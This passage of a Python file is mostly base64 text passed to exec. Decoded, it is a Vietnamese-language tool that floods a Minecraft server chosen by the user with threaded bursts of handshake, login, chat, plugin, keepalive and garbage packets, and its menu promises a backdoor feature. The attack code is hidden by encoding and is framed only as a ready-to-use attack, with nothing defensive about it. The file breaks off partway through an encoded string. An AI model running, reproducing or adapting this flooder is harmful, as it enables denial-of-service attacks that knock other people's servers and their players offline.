NLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nI